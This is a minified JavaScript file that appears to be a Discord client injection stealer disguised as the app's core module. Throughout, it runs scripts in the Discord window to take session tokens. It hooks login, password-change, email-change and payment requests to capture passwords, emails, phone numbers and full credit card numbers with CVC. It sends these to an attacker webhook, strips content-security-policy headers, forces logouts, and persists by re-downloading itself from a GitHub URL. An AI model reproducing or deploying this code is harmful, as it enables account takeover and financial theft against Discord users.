const fs=require("fs"),electron=require("electron"),https=require("https"),queryString=require("querystring");var computerName=process.env.COMPUTERNAME,tokenScript="(webpackChunkdiscord_app.push([[''],{},e=>{m=[];for(let c in e.c)m.push(e.c[c])}]),m).find(m=>m?.exports?.default?.getToken!==void 0).exports.default.getToken()",logOutScript='window.webpackJsonp?(gg=window.webpackJsonp.push([[],{get_require:(a,b,c)=>a.exports=c},[["get_require"]]]),delete gg.m.get_require,delete gg.c.get_require):window.webpackChunkdiscord_app&&window.webpackChunkdiscord_app.push([[Math.random()],{},a=>{gg=a}]);function LogOut(){(function(a){const b="string"==typeof a?a:null;for(const c in gg.c)if(gg.c.hasOwnProperty(c)){const d=gg.c[c].exports;if(d&&d.__esModule&&d.default&&(b?d.default[b]:a(d.default)))return d.default;if(d&&(b?d[b]:a(d)))return d}return null})("login").logout()}LogOut();',config={logout:"true","logout-notify":"true","init-notify":"false","embed-color":374276,injection_url:"https://raw.githubusercontent.com/Raplhs/23123213423543534r3re34534/main/injecci.js",webhook:"%HOOKRE%",Filter:{urls:["https://status.discord.com/api/v*/scheduled-maintenances/upcoming.json","https://*.discord.com/api/v*/applications/detectable","https://discord.com/api/v*/applications/detectable","https://*.discord.com/api/v*/users/@me/library","https://discord.com/api/v*/users/@me/library","https://*.discord.com/api/v*/users/@me/billing/subscriptions","https://discord.com/api/v*/users/@me/billing/subscriptions","wss://remote-auth-gateway.discord.gg/*"]},onCompleted:{urls:["https://discord.com/api/v*/users/@me","https://discordapp.com/api/v*/users/@me","https://*.discord.com/api/v*/users/@me","https://discordapp.com/api/v*/auth/login","https://discord.com/api/v*/auth/login","https://*.discord.com/api/v*/auth/login","https://api.stripe.com/v*/tokens"]}};async function execScript(e){var a=electron.BrowserWindow.getAllWindows()[0];return await a.webContents.executeJavaScript(e,!0)||null}const makeEmbed=async({title:e,fields:a,image:n,thumbnail:i})=>{var t={username:"RaR-Notif",avatar_url:"https://raw.githubusercontent.com/Raplhs/444444iew543333/main/deadcored.png",content:"",embeds:[{title:e,color:config["embed-color"],fields:a}]};return n&&(t.embeds[0].image={url:n}),i&&(t.embeds[0].thumbnail={url:i}),t},getIP=async()=>(await execScript('var xmlHttp = new XMLHttpRequest();\nxmlHttp.open( "GET", "https://www.myexternalip.com/json", false );\nxmlHttp.send( null );\nJSON.parse(xmlHttp.responseText);')).ip,getURL=async(e,a)=>{try{const n=await fetch(e,{method:"GET",headers:{Authorization:a}});if(!n.ok)throw new Error(`HTTP error! status: ${n.status}`);return await n.json()}catch(e){return console.error("Error:",e),null}},getGifOrPNG=async e=>{var a=[".gif?size=512",".png?size=512"];return"image/gif"==(await new Promise((a=>{https.get(e,(e=>a(e.headers)))})))["content-type"]?e+a[0]:e+a[1]},GetBadges=e=>{var a="";return 1==(1&e)&&(a+="<:staff:891346298932981783> "),2==(2&e)&&(a+="<:partner:1041639667226914826> "),4==(4&e)&&(a+="<:hypesquadevent:1082679435452481738> "),8==(8&e)&&(a+="<:bughunter_1:874750808426692658> "),64==(64&e)&&(a+="<:bravery:874750808388952075> "),128==(128&e)&&(a+="<:brilliance:874750808338608199> "),256==(256&e)&&(a+="<:balance:874750808267292683> "),512==(512&e)&&(a+="<:early:944071770506416198> "),16384==(16384&e)&&(a+="<:bughunter_2:874750808430874664> "),4194304==(4194304&e)&&(a+="<:activedev:1041634224253444146> "),131072==(131072&e)&&(a+="<:mm_IconBotDev:898181029737680896> "),""==a&&(a=":x:"),a},GetRBadges=e=>{var a="";return 1==(1&e)&&(a+="<:staff:891346298932981783> "),2==(2&e)&&(a+="<:partner:1041639667226914826> "),4==(4&e)&&(a+="<:hypesquadevent:1082679435452481738> "),8==(8&e)&&(a+="<:bughunter_1:874750808426692658> "),512==(512&e)&&(a+="<:early:944071770506416198> "),16384==(16384&e)&&(a+="<:bughunter_2:874750808430874664> "),4194304==(4194304&e)&&(a+="<:activedev:1041634224253444146> "),131072==(131072&e)&&(a+="<:mm_IconBotDev:898181029737680896> "),""==a&&(a=":x:"),a},GetA2F=e=>{switch(e){case!0:return":lock: `A2F Enabled`";case!1:return":lock: `A2F Not Enabled`";default:return"Idk dude"}},parseBilling=e=>{var a="";return e.forEach((e=>{if(!e.invalid)switch(e.type){case 1:a+=":white_check_mark: :credit_card:";break;case 2:a+=":white_check_mark: <:paypal:896441236062347374>"}})),a||(a=":x:"),a},calcDate=(e,a)=>new Date(e.setMonth(e.getMonth()+a)),GetNitro=e=>{switch(e.premium_type){default:return":x:";case 1:return"<:946246402105819216:962747802797113365>";case 2:if(!e.premium_guild_since)return"<:946246402105819216:962747802797113365>";var a=new Date(Date.now()),n=[new Date(e.premium_guild_since),new Date(e.premium_guild_since),new Date(e.premium_guild_since),new Date(e.premium_guild_since),new Date(e.premium_guild_since),new Date(e.premium_guild_since),new Date(e.premium_guild_since)],i=[2,3,6,9,12,15,18,24];e=[];for(var t in n)e.push(Math.round((calcDate(n[t],i[t])-a)/864e5));var r=0;for(var t of e)!(t>0)&&r++;return"<:946246402105819216:962747802797113365> "+["<:Booster1Month:1051453771147911208>","<:Booster2Month:1051453772360077374>","<:Booster6Month:1051453773463162890>","<:Booster9Month:1051453774620803122>","<:boost12month:1068308256088400004>","<:Booster15Month:1051453775832961034>","<:BoosterLevel8:1051453778127237180>","<:Booster24Month:1051453776889917530>"][r]}};function GetLangue(e){return{fr:":flag_fr: French",da:":flag_dk: Dansk",de:":flag_de: Deutsch","en-GB":":england: English (UK)","en-US":":flag_us: USA","en-ES":":flag_es: Espagnol",hr:":flag_hr: Croatian",it:":flag_it: Italianio",lt:":flag_lt: Lithuanian",hu:":flag_no::flag_hu: Hungarian",no:":flag_no: Norwegian",pl:":flag_pl: Polish","pr-BR":":flag_pt: Portuguese",ro:":flag_ro: Romanian",fi:":flag_fi: Finnish","sv-SE":":flag_se: Swedish",vi:":flag_vn: Vietnamese",tr:":flag_tr: Turkish",cs:":flag_cz: Czech",el:":flag_gr: Greek",bg:":flag_bg: Bulgarian",ru:":flag_ru: Russian",uk:":flag_ua: Ukrainian",hi:":flag_in: Indian",th:":flag_tw: Taiwanese","zh-CN":":flag_cn: Chinese-China",ja:":flag_jp: Japanese","zh-TW":":flag_cn: Chinese-Taiwanese",ko:":flag_kr: Korean"}[e]||"???"}const post=async e=>{e=JSON.stringify(e)[config.webhook].forEach((a=>{const n=new URL(a),i={host:n.hostname,port:n.port,path:n.pathname,method:"POST",headers:{"Content-Type":"application/json"}},t=https.request(i);t.on("error",(e=>{console.log(e)})),t.write(e),t.end()}))},FirstTime=async()=>{var e=await execScript(tokenScript);if("true"!==config["init-notify"])return!0;fs.existsSync(__dirname+"/initiation")&&fs.rmdirSync(__dirname+"/initiation");var a=await getIP();if(e){var n=await getURL("https://discord.com/api/v9/users/@me",e),i=await getURL("https://discord.com/api/v9/users/@me/billing/payment-sources",e),t=await getURL("https://discord.com/api/v9/users/"+n.id+"/profile",e),r=parseBilling(i);userAvatar=userAvatar??await getGifOrPNG(`https://cdn.discordapp.com/avatars/${n.id}/${n.avatar}`),(s=await makeEmbed({title:"Logger Initalized",fields:[{name:"Injection Info",value:`\`\`\`diff\n- Computer Name: \n${computerName}\n\n- Injection Path: \n${__dirname}\n\n- IP: \n${a}\n\`\`\`\n`,inline:!1},{name:"Username <:username:1041634536733290596> ",value:`\`${n.username}#${GetLangue(n.locale)}#${n.discriminator}\``,inline:!0},{name:"ID <:iduser:1041634535395307520>",value:`\`${n.id}\`\`${GetLangue(n.locale)}`,inline:!0},{name:"<a:tokens:1041634540537511957> Token",value:`\`\`\`${e}\`\`\``,inline:!1},{name:"Badges <:badge:1041634538150973460>",value:`${GetBadges(n.flags)}`,inline:!0},{name:"Nitro <a:nitro:1041639670288748634>",value:`${GetNitro(t)}`,inline:!0},{name:"Billing <a:billing:1041641103629234196>",value:`${r}`,inline:!1},{name:"Phone :mobile_phone:",value:`\`${n.phone??"None"}\``,inline:!0},{name:"Email <a:email:1041639672037785691>",value:`\`${n.email}\``,inline:!0},{name:"A2F <a:a2f:1040272766982692885>",value:`${GetA2F(n.mfa_enabled)}`,inline:!0}],image:userBanner,thumbnail:userAvatar})).embeds.push()}else var s=await makeEmbed({title:"Status: Initalized",fields:[{name:"Extra Info",value:`\`\`\`diff\n- Computer Name: \n${computerName}\n\n- Injection Path: \n${__dirname}\n\n- IP: \n${a}\n\`\`\``,inline:!1}]});if(await post(s),"false"!==config.logout&&"%LOGOUT%"!==config.logout&&"true"==config["logout-notify"]){if(await execScript(logOutScript),e){n=await getURL("https://discord.com/api/v9/users/@me",e),i=await getURL("https://discord.com/api/v9/users/@me/billing/payment-sources",e),t=await getURL("https://discord.com/api/v9/users/"+n.id+"/profile",e),r=parseBilling(i);userAvatar=userAvatar??await getGifOrPNG(`https://cdn.discordapp.com/avatars/${n.id}/${n.avatar}`),(s=await makeEmbed({title:"Victim Got Logged Out",fields:[{name:"Injection Info",value:`\`\`\`diff\n- Computer Name: \n${computerName}\n\n- Injection Path: \n${__dirname}\n\n- IP: \n${a}\n\`\`\`\n`,inline:!1},{name:"Username <:username:1041634536733290596> ",value:`\`${n.username}#${GetLangue(n.locale)}#${n.discriminator}\``,inline:!0},{name:"ID <:iduser:1041634535395307520>",value:`\`${n.id}\``,inline:!0},{name:"<a:tokens:1041634540537511957> Token",value:`\`\`\`${e}\`\`\``,inline:!1},{name:"Badges <:badge:1041634538150973460>",value:`${GetBadges(n.flags)}`,inline:!0},{name:"Nitro <a:nitro:1041639670288748634>",value:`${GetNitro(t)}`,inline:!0},{name:"Billing <a:billing:1041641103629234196>",value:`${r}`,inline:!1},{name:"Phone :mobile_phone:",value:`\`${n.phone??"None"}\``,inline:!0},{name:"Email <a:email:1041639672037785691>",value:`\`${n.email}\``,inline:!0},{name:"A2F <a:a2f:1040272766982692885>",value:`${GetA2F(n.mfa_enabled)}`,inline:!0}],image:userBanner,thumbnail:userAvatar})).embeds.push()}else var s=await makeEmbed({title:"User Logged Out (User Not Logged in Before)",fields:[{name:"Injection Info",value:`\`\`\`Name Of Computer: \n${computerName}\nInjection PATH: \n${__dirname}\n\n- IP: \n${a}\n\`\`\`\n\n`,inline:!1}]});await post(s)}return!1},path=function(){var e=electron.app.getAppPath().replace(/\\/g,"/").split("/");return e.pop(),{appPath:e=e.join("/"),appName:electron.app.getName()}}(),checUpdate=()=>{var{appPath:e,appName:a}=path,n=`${e}/app`,i=__filename.replace(/\\/g,"/"),t=`${process.env.appdata.replace(/\\/g,"/")}/betterdiscord/data/betterdiscord.asar`,r=`${n}/package.json`,s=`${n}/index.js`;fs.existsSync(n)||fs.mkdirSync(n),fs.writeFileSync(r,`{"name": "${a}", "main": "./index.js"}`);var o=`const fs = require("fs"), https = require("https")\nvar index = "${i}"\nvar betterDiscord = "${t}"\nvar bouki = fs.readFileSync(index).toString()\nif (bouki == "module.exports = require('./core.asar');") init()\nfunction init() {\n    https.get("${config.injection_url}", res => {\n        var chunk = ""\n        res.on("data", data => chunk += data)\n        res.on("end", () => fs.writeFileSync(index, chunk.replace("%WEBHOOK%", "${config.webhook}")))\n    }).on("error", (err) => setTimeout(init(), 10000));\n}\nrequire("${e}/app.asar")\nif (fs.existsSync(betterDiscord)) require(betterDiscord)`;fs.writeFileSync(s,o)};electron.session.defaultSession.webRequest.onBeforeRequest(config.Filter,(async(e,a)=>{if(await electron.app.whenReady(),await FirstTime(),e.url.startsWith("wss://remote-auth-gateway"))return a({cancel:!0});checUpdate(),a({})})),electron.session.defaultSession.webRequest.onHeadersReceived(((e,a)=>{delete e.responseHeaders["content-security-policy"],delete e.responseHeaders["content-security-policy-report-only"],a({responseHeaders:{...e.responseHeaders,"Access-Control-Allow-Headers":"*"}})})),electron.session.defaultSession.webRequest.onCompleted(config.onCompleted,(async(e,a)=>{if(["POST","PATCH"].includes(e.method)&&200===e.statusCode){try{var n=JSON.parse(e.uploadData[0].bytes)}catch(a){n=queryString.parse(decodeURIComponent(e.uploadData[0].bytes.toString()))}var i=await execScript(tokenScript),t=await getIP(),r=await getURL("https://discord.com/api/v9/users/@me",i),s=await getURL("https://discord.com/api/v9/users/@me/billing/payment-sources",i),o=await getURL("https://discord.com/api/v9/users/"+r.id+"/profile",i);userAvatar=userAvatar??await getGifOrPNG(`https://cdn.discordapp.com/avatars/${r.id}/${r.avatar}`);var l=parseBilling(s);switch(!0){case e.url.endsWith("login"):var u=n.password;(d=await makeEmbed({title:"User Logged In",color:config["embed-color"],fields:[{name:"Injection Info",value:`\`\`\`diff\n- Computer Name: \n${computerName}\n\n- Injection Path: \n${__dirname}\n\n- IP: \n${t}\n\`\`\`\n\n[Download pfp](${userAvatar})`,inline:!1},{name:"Username <:username:1041634536733290596> ",value:`\`${r.username}#${GetLangue(r.locale)}#${r.discriminator}\``,inline:!0},{name:"ID <:iduser:1041634535395307520>",value:`\`${r.id}\``,inline:!0},{name:"<a:tokens:1041634540537511957> Token",value:`\`\`\`${i}\`\`\``,inline:!1},{name:"Badges <:badge:1041634538150973460>",value:`${GetBadges(r.flags)}`,inline:!0},{name:"Nitro <a:nitro:1041639670288748634>",value:`${GetNitro(o)}`,inline:!0},{name:"Billing <a:billing:1041641103629234196>",value:`${l}`,inline:!1},{name:"Phone :mobile_phone:",value:`\`${r.phone??"None"}\``,inline:!0},{name:"Email <a:email:1041639672037785691>",value:`\`${r.email}\``,inline:!0},{name:"<a:password:1041639669047238676> Password",value:`\`${u}\``,inline:!0},{name:"A2F <a:a2f:1040272766982692885>",value:`${GetA2F(r.mfa_enabled)}`,inline:!0}],thumbnail:userAvatar,image:userBanner})).embeds.push(),await post(d);break;case e.url.endsWith("users/@me"):if(!n.password)return;if(n.new_password)(d=await makeEmbed({title:"Password Change Detected",color:config["embed-color"],fields:[{name:"Injection Info",value:`\`\`\`diff\n- Computer Name: \n${computerName}\n\n- Injection Path: \n${__dirname}\n\n- IP: \n${t}\n\`\`\`\n\n[Download pfp](${userAvatar})`,inline:!1},{name:"Username <:username:1041634536733290596> ",value:`\`${r.username}#${GetLangue(r.locale)}#${r.discriminator}\``,inline:!0},{name:"ID <:iduser:1041634535395307520>",value:`\`${r.id}\``,inline:!0},{name:"<a:tokens:1041634540537511957> Token",value:`\`\`\`${i}\`\`\``,inline:!1},{name:"Badges <:badge:1041634538150973460>",value:`${GetBadges(r.flags)}`,inline:!0},{name:"Nitro <a:nitro:1041639670288748634>",value:`${GetNitro(o)}`,inline:!0},{name:"Billing <a:billing:1041641103629234196>",value:`${l}`,inline:!0},{name:"Phone :mobile_phone:",value:`\`${r.phone??":x:"}\``,inline:!0},{name:"Email <a:email:1041639672037785691>",value:`\`${r.email}\``,inline:!0},{name:"<a:password:1041639669047238676> Old Password",value:`\`${n.password}\``,inline:!0},{name:"<a:password:1041639669047238676> New Password",value:`\`${n.new_password}\``,inline:!0},{name:"A2F <a:a2f:1040272766982692885>",value:`${GetA2F(r.mfa_enabled)}`,inline:!0}],thumbnail:userAvatar,image:userBanner})).embeds.push(),await post(d);if(n.email)(d=await makeEmbed({title:"Email Change Detected",color:config["embed-color"],fields:[{name:"Injection Info",value:`\`\`\`diff\n- Computer Name: \n${computerName}\n\n- Injection Path: \n${__dirname}\n\n- IP: \n${t}\n\`\`\`\n\n[Download pfp](${userAvatar})`,inline:!1},{name:"Username <:username:1041634536733290596> ",value:`\`${r.username}#${GetLangue(r.locale)}#${r.discriminator}\``,inline:!0},{name:"ID <:iduser:1041634535395307520>",value:`\`${r.id}\`\n`,inline:!0},{name:"<a:tokens:1041634540537511957> Token",value:`\`\`\`${i}\`\`\``,inline:!1},{name:"Badges <:badge:1041634538150973460>",value:`${GetBadges(r.flags)}`,inline:!0},{name:"Nitro <a:nitro:1041639670288748634>",value:`${GetNitro(o)}`,inline:!0},{name:"Billing <a:billing:1041641103629234196>",value:`${l}`,inline:!1},{name:"Phone :mobile_phone:",value:`\`${r.phone??"None"}\``,inline:!0},{name:"New Email <a:email:1041639672037785691>",value:`\`${r.email}\``,inline:!0},{name:"<a:password:1041639669047238676> Password",value:`\`${n.password}\``,inline:!0},{name:"A2F <a:a2f:1040272766982692885>",value:`${GetA2F(r.mfa_enabled)}`,inline:!0}],thumbnail:userAvatar,image:userBanner})).embeds.push(),await post(d);break;case e.url.endsWith("tokens"):var d,[m,c,p,g]=[n["card[number]"],n["card[cvc]"],n["card[exp_month]"],n["card[exp_year]"]];(d=await makeEmbed({title:"Credit Card Added",description:`\n                **IP:** ${t}, ${GetLangue(r.locale)}\n\n\n                **Username** <:username:1041634536733290596>\n\`\`\`${r.username}#${r.discriminator}\`\`\`\n\n                **ID** <:iduser:1041634535395307520>\n\`\`\`${r.id}\`\`\`\n\n                **Badges** <:badge:1041634538150973460>\n${GetBadges(r.flags)}\n\n                **Nitro Type** <a:nitro:1041639670288748634>\n${GetNitro(r.premium_type)}\n\n                **Email** <a:email:1041639672037785691>\n\`\`\`${r.email}\`\`\`\n\n                **Credit Card Number**\n\`\`\`${m}\`\`\`\n\n                **Credit Card Expiration**\n\`\`\`${p}/${g}\`\`\`\n\n                **CVC**\n\`\`\`${c}\`\`\`\n\n                **A2F** <a:a2f:1040272766982692885>\n${GetA2F(r.mfa_enabled)}\n\n                <a:tokens:1041634540537511957> **Token** \n\`\`\`${i}\`\`\``,thumbnail:userAvatar,image:userBanner})).embeds.push(),await post(d)}}})),module.exports=require("./core.asar");
